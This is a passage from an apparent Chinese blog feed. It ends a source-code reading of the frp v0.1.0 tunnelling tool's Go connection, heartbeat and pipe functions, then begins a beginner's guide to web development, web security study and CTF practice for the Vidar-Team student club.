class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Conn <span class="keyword">struct</span> &#123;</span><br><span class="line">TcpConn   *net.TCPConn</span><br><span class="line">Reader    *bufio.Reader</span><br><span class="line">closeFlag <span class="type">bool</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ConnectServer</span><span class="params">(host <span class="type">string</span>, port <span class="type">int64</span>)</span></span> (c *Conn, err <span class="type">error</span>) &#123;</span><br><span class="line">c = &amp;Conn&#123;&#125;</span><br><span class="line">    <span class="comment">// 使用 net.ResolveTCPAddr 解析 TCP 地址</span></span><br><span class="line">servertAddr, err := net.ResolveTCPAddr(<span class="string">&quot;tcp4&quot;</span>, fmt.Sprintf(<span class="string">&quot;%s:%d&quot;</span>, host, port))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// 建立到服务器的 TCP 连接</span></span><br><span class="line">conn, err := net.DialTCP(<span class="string">&quot;tcp&quot;</span>, <span class="literal">nil</span>, servertAddr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// 将建立的 TCP 连接赋给 Conn 结构体的 TcpConn 字段</span></span><br><span class="line">c.TcpConn = conn</span><br><span class="line">    <span class="comment">// 创建一个新的缓冲读取器，并赋给 Conn 的 Reader 字段</span></span><br><span class="line">c.Reader = bufio.NewReader(c.TcpConn)</span><br><span class="line">    <span class="comment">// 表示连接目前是打开的</span></span><br><span class="line">c.closeFlag = <span class="literal">false</span></span><br><span class="line"><span class="keyword">return</span> c, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 同文件中用于操作 Conn 结构体的函数此处不再展示</span></span><br><span class="line"><span class="comment">// 还有一个用于实现隧道通信的 Join 函数，稍后会说</span></span><br></pre></td></tr></table></figure><p>然后看 <code>startHeartBeat</code> 函数，该函数用于发起心跳包维持客户端与服务端的连接：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">startHeartBeat</span><span class="params">(c *conn.Conn)</span></span> &#123;</span><br><span class="line">    <span class="comment">// 心跳超时则关闭连接</span></span><br><span class="line">f := <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">log.Error(<span class="string">&quot;HeartBeat timeout!&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> c != <span class="literal">nil</span> &#123;</span><br><span class="line">c.Close()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">   <span class="comment">// 创建一个计时器，在指定的心跳超时时间后执行函数f</span></span><br><span class="line">heartBeatTimer = time.AfterFunc(time.Duration(client.HeartBeatTimeout)*time.Second, f)</span><br><span class="line"><span class="comment">// 确保在函数退出前停止计时器</span></span><br><span class="line">    <span class="keyword">defer</span> heartBeatTimer.Stop()</span><br><span class="line"></span><br><span class="line">clientCtlReq := &amp;msg.ClientCtlReq&#123;</span><br><span class="line">Type:      consts.CSHeartBeatReq,</span><br><span class="line">ProxyName: <span class="string">&quot;&quot;</span>,</span><br><span class="line">Passwd:    <span class="string">&quot;&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 将心跳请求序列化为JSON格式</span></span><br><span class="line">request, err := json.Marshal(clientCtlReq)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Warn(<span class="string">&quot;Serialize clientCtlReq err! Err: %v&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 进入一个无限循环，每次循环开始时都会休眠一段时间，这个时间由心跳间隔决定</span></span><br><span class="line">log.Debug(<span class="string">&quot;Start to send heartbeat&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">time.Sleep(time.Duration(client.HeartBeatInterval) * time.Second)</span><br><span class="line"><span class="keyword">if</span> c != <span class="literal">nil</span> &amp;&amp; !c.IsClosed() &#123;</span><br><span class="line">err = c.Write(<span class="type">string</span>(request) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Error(<span class="string">&quot;Send hearbeat to server failed! Err:%v&quot;</span>, err)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">log.Debug(<span class="string">&quot;Heartbeat exit&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在，我们实现了客户端与服务端的连接，并在连接后依靠心跳机制实现了维持通信，下一步就是建立隧道，实现通信功能。视角转到 <code>utils/conn</code> 的 <code>StartTunnel</code> 函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *ProxyClient)</span></span> StartTunnel(serverAddr <span class="type">string</span>, serverPort <span class="type">int64</span>) (err <span class="type">error</span>) &#123;</span><br><span class="line"><span class="comment">// 建立到本地服务的连接</span></span><br><span class="line">    localConn, err := p.GetLocalConn()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ★ 建立到服务端的连接</span></span><br><span class="line">    remoteConn, err := p.GetRemoteConn(serverAddr, serverPort)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// l means local, r means remote</span></span><br><span class="line">log.Debug(<span class="string">&quot;Join two conns, (l[%s] r[%s]) (l[%s] r[%s])&quot;</span>, localConn.GetLocalAddr(), localConn.GetRemoteAddr(),</span><br><span class="line">remoteConn.GetLocalAddr(), remoteConn.GetRemoteAddr())</span><br><span class="line">    <span class="comment">// ★ 创建协程将本地连接和远程连接“连接”起来，使得数据可以在两者之间传输</span></span><br><span class="line"><span class="keyword">go</span> conn.Join(localConn, remoteConn)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>建立到本地服务的连接没什么好说的，获取配置文件中的本地端口做个调用即可。着重看下 <code>GetRemoteConn</code> 函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *ProxyClient)</span></span> GetRemoteConn(addr <span class="type">string</span>, port <span class="type">int64</span>) (c *conn.Conn, err <span class="type">error</span>) &#123;</span><br><span class="line">    <span class="comment">// 使用 defer 关键字来确保在函数返回前关闭连接</span></span><br><span class="line"><span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.Close()</span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line">c, err = conn.ConnectServer(addr, port)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Error(<span class="string">&quot;ProxyName [%s], connect to server [%s:%d] error, %v&quot;</span>, p.Name, addr, port, err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造一个客户端控制请求消息，声明为工作连接</span></span><br><span class="line">req := &amp;msg.ClientCtlReq&#123;</span><br><span class="line">Type:      consts.WorkConn,</span><br><span class="line">ProxyName: p.Name,</span><br><span class="line">Passwd:    p.Passwd,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将请求序列化为 JSON 格式并发送</span></span><br><span class="line">buf, _ := json.Marshal(req)</span><br><span class="line">err = c.Write(<span class="type">string</span>(buf) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Error(<span class="string">&quot;ProxyName [%s], write to server error, %v&quot;</span>, p.Name, err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = <span class="literal">nil</span></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后我们再转到 <code>Join</code> 函数，这个函数是搭建隧道的关键，本质上就是实现两个连接之间的双向数据传输：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Join</span><span class="params">(c1 *Conn, c2 *Conn)</span></span> &#123;</span><br><span class="line">    <span class="comment">// 等待两个数据传输协程的完成</span></span><br><span class="line"><span class="keyword">var</span> wait sync.WaitGroup</span><br><span class="line">    <span class="comment">// 从一个连接读取数据并写入到另一个连接</span></span><br><span class="line">    <span class="comment">// defer 用于确保在函数结束时关闭连接并通知 WaitGroup 协程已完成</span></span><br><span class="line">pipe := <span class="function"><span class="keyword">func</span><span class="params">(to *Conn, from *Conn)</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> to.Close()</span><br><span class="line"><span class="keyword">defer</span> from.Close()</span><br><span class="line"><span class="keyword">defer</span> wait.Done()</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> err <span class="type">error</span></span><br><span class="line">        <span class="comment">// 使用 io.Copy 函数将数据从一个连接复制到另一个连接</span></span><br><span class="line">        <span class="comment">// 这个操作会持续进行，直到遇到错误或者EOF（文件结束标志</span></span><br><span class="line">_, err = io.Copy(to.TcpConn, from.TcpConn)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Warn(<span class="string">&quot;join conns error, %v&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">wait.Add(<span class="number">2</span>)</span><br><span class="line">    <span class="comment">// 启动两个协程，分别处理从 c1 到 c2 和从 c2 到 c1 的数据传输</span></span><br><span class="line"><span class="keyword">go</span> pipe(c1, c2)</span><br><span class="line"><span class="keyword">go</span> pipe(c2, c1)</span><br><span class="line">wait.Wait()</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h2><p>Ok，至此，frp v0.1.0 的源码就分析的差不多了，虽说有点老（接近 10 年前），但对理解内网穿透的实现原理也是很有帮助的。之后的版本中虽然做了很多改进，但整体实现思路其实没有太大变化。</p><p>虽说不是第一次试着去阅读某个工具的源码，但边学边写博文还是第一次，可能略有混乱，但感觉也还好？唯一的问题是不适合把一段代码拆开，以 frpc 的 <code>controlWorker</code> 举例，里面先后使用了两个重要函数，一般这种情况下，我会按照代码执行逻辑先跳转到对应函数看看这个函数做了什么，看完之后再。但写文章的时候拆开整个函数，先贴前半部分，中间再塞调用的函数，然后再贴后半段函数，就感觉很怪，所以在这篇文章里，我就直接先介绍整个函数，标注其中调用的重要函数，然后在之后单独介绍。</p><p>然后通篇写下来，想要吐槽的是 Golang 的错误处理机制，不论是阅读的时候还是写文章的时候都感到略有麻烦。就是那种，大家都知道按照 Golang 的风格会在操作跟一个错误处理，控制日志模块输出些信息，多数情况下对核心功能的实现没什么帮助，但你又不好省略，因为就多出两三行，贴代码的时候用 <code>// ... ...</code> 代替效果也有限，但直接省去不写也感觉很不对。就比较难受。</p><p>别的都还好。</p><p>我能找到的还有一篇 FRP v0.5.0 源码阅读的文章，感兴趣的可以跳过去看看，也挺不错的：</p><p><a href="https://www.joxrays.com/frp-source-code/">https://www.joxrays.com/frp-source-code/</a></p>]]></content>
      
      
      <categories>
          
          <category> Development </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FRP </tag>
            
            <tag> NetWork </tag>
            
            <tag> Source Code </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HelloWeb 致新生</title>
      <link href="/2024/05/21/2024/hello-web/"/>
      <url>/2024/05/21/2024/hello-web/</url>
      
        <content type="html"><![CDATA[<blockquote><p>🚀本文档面向初次踏入 The Web World 的新生，希望为你们提供一个可供参考的学习路线。</p></blockquote><blockquote><p>✨该文档最早公开于 <a href="https://github.com/ma5hr00m/HelloWeb">ma5hr00m&#x2F;HelloWeb</a>，计划用于 Vidar-Team2024 届招新。</p></blockquote><p><img src="https://img.ma5hr00m.top/blog/helloweb-banner.png" alt="helloweb-banner"></p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Web 安全与 Web 开发往往是绑定在一起的，所以本文档会同时介绍 <strong>安全&amp;开发</strong>，还会有一些零零散散的其他想要告诉新生的东西，所以内容会略多，希望多点耐心看完。</p><p>在开始之前，你们需要准备一些东西，要求不高，相信大家都有：</p><ul><li>🧠能<strong>独立思考</strong>的大脑</li><li>💻可以使用的电脑</li><li>🔮流畅的网络</li><li>❤️<strong>积极好学</strong>的心</li></ul><p>此外，所有想要涉足计算机领域的新生，都有必要去阅读一篇文章，其名为**《提问的智慧》**。篇幅不长，20min 即可，你可以从中学习到如何提出 <strong>一个有价值的问题</strong>，而不是掏出手机拍一张电脑屏幕，丢进群里就问“我该怎么办”，这是在浪费大家的时间。同时，你也可以把《提问的智慧》当作⼀个 AI prompt 指南。因为不论是对⼈还是对机器，提出一个有效的问题都能事半功倍地解决问题。</p><p>你可以点击下面的链接以阅读这篇文章。此外，Vidar-Team2024 招新群中也提供了 PDF 版本，需要请自取。</p><ul><li><a href="https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way/blob/main/README-zh_CN.md">简体中文版《提问的智慧》</a></li></ul><blockquote><p>🔍如果在此之前，你完全没有了解过计算机，但觉得能够成为一个整天抱着电脑“哐哐哐”敲键盘、张口闭口都是别人听不懂的怪话的程序猿是一件很酷的事情，那你依然可以阅读本文档，但其中很多名词你可能从未了解，你可以暂时跳到 <em><strong>0x05 泛用技能- 信息搜集</strong></em> 小节。</p></blockquote><blockquote><p>📷学会截屏。</p></blockquote><h2 id="0x01-Web"><a href="#0x01-Web" class="headerlink" title="0x01 Web"></a>0x01 Web</h2><p><a href="https://en.wikipedia.org/wiki/World_Wide_Web">Web</a> 是 World Wide Web 的简称，是一个通过互联网访问的、由许多互相链接的的超文本组成的信息系统。这是指的广义上的 Web，即涵盖了整个世界范围内的互联网服务和资源的集合。这包括所有 <strong>通过互联网连接</strong> 的设备、服务、网络协议以及通过这些设备和服务访问的内容，它超越了单纯的网页和浏览器，涵盖了从大型服务器到个人设备的所有互联网技术。</p><p>我们日常所说的往往是狭义上的 Web，更加专注于构成网站和网络应用技术实践，包括传统的前后端开发、运维以及 Web 安全等领域。这与大家的生活就很贴近了，今日的学习、办公、娱乐都已经脱离不开网络应用技术，输入一串 URL 后浏览器如何得到一个功能完备的 Web 页面、在自己手机的“学习通”里上传一份 docx 附件后如何将其传递给教师，这都属于 Web 的范畴。现在的你可能并不明晰这些功能的实现原理，但经过一段时间的学习，相信你就可以对这些功能的实现有一个明确的认知，或者已经能够自己开发一个具备类似功能的 Web 应用。</p><p>除非有特殊说明，本文档后面的 Web 都是指狭义上的 Web 应用。</p><h3 id="发展史"><a href="#发展史" class="headerlink" title="发展史"></a>发展史</h3><p>最初的 Web 应⽤非常简陋，程序托管在 ISP（Internet Service Provider，互联网服务提供商）那里，用户在自己的主机上访问对应 IP 获得对应的静态页面，页面中只有⽂字与图⽚，当时的用户能做的也只是浏览⽹⻚，没法与网页背后的机器（或人）进行更多的交流。这只是一个单方向的信息输出，人们并不满足于这一点。</p><p>为了丰富 Web 应用的功能，满足人们增长的需求，之后就有了 Flash 等媒体技术，大名鼎鼎的 JavaScript 编程语言也被研发出来。⾳视频和动态交互的实现给予了用户更高的自由度，越来越多的公司也开始通过互联网宣传自家产品，让潜在用户在家就能看到他们的产品信息。</p><p>随后，CGI（Common GatewayInterface）技术出现，Web 服务器可以通过 CGI 执⾏外部程序，外部程序可以根据请求内容⽣成动态内容返回给用户。现代 Web 应用的雏形已经出现。</p><p>再之后，随着 PHP&#x2F;JSP 等编程语⾔的开发，MVC 思想、REST（Representation State Transformation）架构⻛格的提出，Web 应⽤的功能进一步增强，一片勃勃生机万物竞发之势。但随之而来的是安全问题频出，Web 安全也开始得到开发者的重视。</p><p>在之后就是越来越多的 Web 技术出现、应用逻辑越来越复杂，部分 Web 开发者难以忍受同时编写数据处理逻辑和网站页面，前后端分化。分化之后开发者们有了更多的精力钻研自己感兴趣的领域，技术不断发展，直到今天。</p><p>这里简单说说 <strong>前后端的划分</strong>。前端就是⽤⼾可以直接看⻅的部分，⽐如说我们访问 <a href="https://www.baidu.com/">baidu.com</a>，浏览器显示的搜索框、按钮等组件，以及我们输入 URL 之后字符串如何传递给后端应用，这些都属于 Web 前端的范畴；与之相对的，后端就主要是⽤⼾看不⻅的部分，⽐如在百度中搜索 <a href="https://www.baidu.com/s?wd=Vidar-Team">Vidar-Team</a>，服务器在数据库中根据关键词查找相关内容，处理后整合成格式恰当的数据，再交给前端让浏览器去渲染出一个包含相关信息的页面，这就是 Web 后端负责的⼯作。</p><h3 id="Web-应用中的数据传递"><a href="#Web-应用中的数据传递" class="headerlink" title="Web 应用中的数据传递"></a>Web 应用中的数据传递</h3><blockquote><p>这部分内容对 0 基础新生来说可能较为困难，可暂时跳过。</p></blockquote><p>打开浏览器，地址栏中敲入 <a href="https://vidar.club/">https://vidar.club</a> 并回车，浏览器片刻就会返回给我们 Vidar-Team 的官网首页，这是如何实现的呢？下面我们会以此为例讲讲 Web 应用中的数据传递。</p><p>当浏览器接收到用户输入的 URL 时，首先会做的就是 <a href="https://www.ruanyifeng.com/blog/2022/08/dns-query.html">DNS 查询</a>，浏览器会去查找这个 URL 背后对应的资源在什么地方，也就是这个域名对应的 IP 是什么。 </p><p><img src="https://img.ma5hr00m.top/blog/helloweb-dns.png" alt="helloweb-dns"></p><p>目前常见的 IP 地址格式一般为 <a href="">xxx.xxx.xxx.xxx</a>，但人类要记住这样的 12 位纯数字比较困难。因此，开发者们决定⽤形象的域名（domain）来让⽤⼾记住资源的位置。你看，<a href="https://vidar.club/">vidar.club</a> 就⽐ <a href="1.117.117.147">1.117.117.147</a> 这个 IP 好记太多了吧？浏览器根据域名向 DNS 服务器查询对应 IP 地址。DNS 服务器就像一本电话簿，里面详细记录了各种各样的域名与其对应的 IP 地址。在这个例子中，浏览器得到对应的 IP 地址就是 <a href="1.117.117.147">1.117.117.147</a>。 </p><p>浏览器得知服务器的 IP 地址后，就会与其对应的服务器进⾏ TCP 三次握⼿。三次握⼿机制的目的时让通信的两端建立可靠的连接，毕竟谁也不想看到一个内容残缺的网页。为了让连接更加安全，本地主机与服务器在三次握手之后就会进⾏ TLS 协商。你看我们输⼊的是 <code>https://</code>，这表明我们使⽤了 HTTPS 协议访问主机资源。相⽐于明文传输数据的 HTTP，HTTPS 使⽤了 SSL&#x2F;TLS 协议对数据进⾏了加密处理，这会让访问变得更加安全。当三次握⼿和 TLS 协商完成后，我们就已经和服务器建⽴了安全连接啦。</p><blockquote><p>顺带一提，如果使用 <code>http://</code> 访问协会官网也会强制转化为 <code>https://</code> 哦，可以试试 <a href="http://vidar.club/">http://vidar.club</a>。</p></blockquote><p>建⽴安全连接后，浏览器会向服务器发送 HTTP <code>GET</code> 请求，请求服务器返回我们事先放在服务器上的对应⽹⻚的内容，这个请求的内容通常是⼀个 HTML ⽂件。当服务器收到请求后，就会使⽤相关的响应头和 HTML 内容进⾏回复。</p><p><img src="https://img.ma5hr00m.top/blog/helloweb-burpsuite.png" alt="helloweb-burpsuite"></p><p>浏览器收到来自服务器的 <code>200 OK</code> 的 HTTP 响应，并收到服务端发过来的 HTML ⽂件后，会处理 HTML 标记并且构建 DOM 树，继⽽处理⻚⾯中引⽤的 CSS ⽂件，构建 CSSOM，将 DOM 树和 CSSOM 合并为渲染树，计算渲染树中每个元素的位置和⼤⼩，并确定它们在⻚⾯上的布局，最后在屏幕上进⾏绘制，最终就形成你看到的⻚⾯啦。</p><p>HTTP 请求和响应的具体内容可以使⽤浏览器（推荐使⽤ Chrome、Firefox 或 Edge）的 F12 开发者⼯具进⾏查看，或者使用上图中的 BurpSuite 或者 Yakit 等抓包工具。</p><p><img src="https://img.ma5hr00m.top/blog/helloweb-edge.png" alt="helloweb-edge"></p><p>如果对 Web 应用中的数据传递还有疑问，可先后观看以下两个视频，可以让你快速了解互联⽹和浏览器的运作流程：</p><ul><li><a href="https://www.bilibili.com/video/BV1Rz4y197Jd/?spm_id_from=333.788.recommend_more_video.-1&vd_source=d77df35177e7fa05ef5f9e0b6ddf2180">10 分钟带你了解互联⽹是如何运作的</a></li><li><a href="https://www.bilibili.com/video/BV1x54y1B7RE/?spm_id_from=333.788.recommend_more_video.0&vd_source=d77df35177e7fa05ef5f9e0b6ddf2180">浏览器是如何运作的</a></li></ul><h2 id="0x02-Web安全"><a href="#0x02-Web安全" class="headerlink" title="0x02 Web安全"></a>0x02 Web安全</h2><h3 id="我是零基础小白，从哪里开始好呢？"><a href="#我是零基础小白，从哪里开始好呢？" class="headerlink" title="我是零基础小白，从哪里开始好呢？"></a>我是零基础小白，从哪里开始好呢？</h3><p>在 Web 安全领域中，我们较少提及 <code>C/C++</code>，更多的是 <code>Java</code>、<code>PHP</code>、<code>Golang</code> 等语言相关的安全问题。不过，如果你⽬前没有任何编程基础，我们依然推荐你先好好学习 C 语⾔。对于没有编程基础的新生，从 C 语⾔这样⼀⻔接近底层的⾼级语⾔开始学习，可以更好地学习计算机内部原理。并且，在学习 C 语⾔后，你就有了⼀定的编程基础，⼊⻔其他语⾔也绝⾮难事。</p><p>C 语言的推荐教程是《C Primer Plus》，你可以跟着本书中的内容学习 C 语言。在学习的过程中，鼓励你跟着教程多上手跟着敲代码。计算机的学习与实践结合紧密，不是传统背书就行的。电子书地址提供在此，自行取用：</p><ul><li><a href="https://github.com/erhuoyan/bookrack/blob/master/C%20Primer%20Plus%20%E7%AC%AC6%E7%89%88%20%E4%B8%AD%E6%96%87%E7%89%88.pdf">《C Primer Plus 第6版 中文版》PDF 文件</a></li><li><a href="https://github.com/ShujiaHuang/Cpp-Primer-Plus-6th?tab=readme-ov-file">《C++ Primer Plus 第6版 中文版》原书代码和习题解答</a></li></ul><p>在上手敲代码之前，记得在你的系统中配置好 C 开发环境。</p><h3 id="技术栈的选择"><a href="#技术栈的选择" class="headerlink" title="技术栈的选择"></a>技术栈的选择</h3><p>需要明确的是，安全和开发密不可分，在 Web 领域尤其如此。</p><p>开发是安全的基础，如果没有⼀定的开发能⼒，在之后的 Web 安全学习中，⾯对⼀些代码审计也会感到⾮常茫然。所以，在学习 Web 安全之前，有必要先掌握一定的 Web 开发技术。</p><blockquote><p>🛠️如果你想要先行学习 Web 开发，可以跳到 <em><strong>0x03 Web开发</strong></em> 小节。</p></blockquote><p>我们一般推荐，在入门 Web 安全的同时，要同步学习并掌握一门较为熟悉的 Web 后端开发语言，你可以在 Java&#x2F;Golang&#x2F;PHP&#x2F;Node.js 中任选其一，当然其他的语言比如 Rust 也可以，遵循自己的喜好选择即可。</p><p>往前推个几年，研究 Web 安全最流行也必须掌握的语言是 PHP，那时的 CTF Web 赛题也是 PHP 赛题占主导。但在这两年风向有所变化，很多安全行业大牛（比如 <a href="https://www.leavesongs.com/">phith0n</a>）认为，现在入门 Web 安全及漏洞挖掘最推荐学习的语言是 Java，毕竟现在多数 Web 应用都是之前的 Java 开发者留下的，包括现在的 CTF Web 中 Java 题目的占比也是越来越大。所以，如果你对前面提到的后端开发语言都不熟悉，不知道该选择哪个，也没什么很明确的规划，那就可以把 Java 作为首选项。</p><p>此外，在 Web 安全领域中，确实有前端安全的存在，比如 XSS 等，但前端安全很多时候是作为一个“锦上添花”的存在，不是很推荐作为主要研究方向。当然，一切看你兴趣。</p><ul><li><a href="https://websec.readthedocs.io/zh/latest/">Web 安全学习笔记</a></li></ul><h3 id="CTF竞赛"><a href="#CTF竞赛" class="headerlink" title="CTF竞赛"></a>CTF竞赛</h3><p>⼀直以来，Web 安全都是 CTF 竞赛重要的组成部分。</p><p>CTF 竞赛⽬前主体还是 <a href="https://ctf-wiki.org/introduction/mode/">Jeopardy 解题模式</a>，分为 Web&#x2F;Re&#x2F;Pwn&#x2F;Crypto&#x2F;Misc 五个⽅向。相⽐⼆进制，Web 安全在初期⼊⻔时⻔槛较低，并不需要对底层知识有太多的了解，对⼩⽩较为友好，能够快速上⼿做题。</p><p>但不得不承认，Web 安全涉及内容更 <strong>杂</strong>。入门 Reverse 逆向工程，你只需要能读懂 C 即可，但入门 Web 需要你能在较短时间内快速接触并了解 Java&#x2F;PHP&#x2F;Golang 等编程语言。这需要你能坚持学习并投入一定量的时间。</p><p>倒也不用焦虑，刚上手有不懂的很正常。CTF 比较讲究一个实践先于理论，你很难办到先把理论一口气全部学完，然后再开始上手实践，这不怎么现实，因为东西又多又杂，你也摸不准一道题目会想考你什么。遇到不会的积极去查去学就可以，什么不会补什么，多做题多做笔记，遇到不会的题目就及时复现写 Writeup，刚开始的时候多坐牢（指做不出来题目盯着屏幕做无用功），后面就能少做牢。</p><p>在每个学年的上学期，Vidar-Team 会开放 HGAME-MINI 新生训练平台，里面的题目难度都比较适合初学者，可以多参与多做题，尝试把 Web 方向 AK 掉（All kill，指完成全部题目）。如果你想多做一些题目多学技术，可以使用下面的几个平台，这些平台都会提供往年的 CTF 赛题：</p><ul><li><a href="https://buuoj.cn/">buuoj</a></li><li><a href="https://adworld.xctf.org.cn/">攻防世界</a></li></ul><p>此外，有一个较为特殊的 Web 靶场，即由 BurpSuite 官方提供的 PortSwigger 靶场。该靶场收录了几乎所有 Web 常见漏洞，提供了原理讲解和由易到难、种类齐全的 100+ 练习题，并提供了官方题解和社区视频题解，在此过程中你还能熟悉 BurpSuite 的使用，非常推荐。</p><p><img 